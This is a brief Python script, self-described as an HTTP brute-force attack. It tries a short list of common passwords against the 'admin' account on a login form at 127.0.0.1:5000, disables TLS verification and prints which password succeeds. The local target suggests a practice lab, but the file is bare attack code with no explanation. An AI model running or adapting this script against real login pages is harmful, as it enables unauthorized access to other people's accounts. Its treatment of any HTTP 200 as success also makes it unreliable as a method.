import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.trust_env = False

target_url = "http://127.0.0.1:5000/login"
wordlist = ["123456", "password", "admin", "qwerty", "secret123", "letmein"]

print("Starting HTTP Brute-Force attack...")

for password in wordlist:
    data = {"username": "admin", "password": password}
    
    try:
        response = session.post(target_url, data=data, verify=False)
        
        if response.status_code == 200:
            print(f"\n[+] SUCCESS! Password found: {password}")
            break
        else:
            print(f"[-] Failed: {password} (Status: {response.status_code})")
            
    except Exception as e:
        print(f"[!] Error: {e}")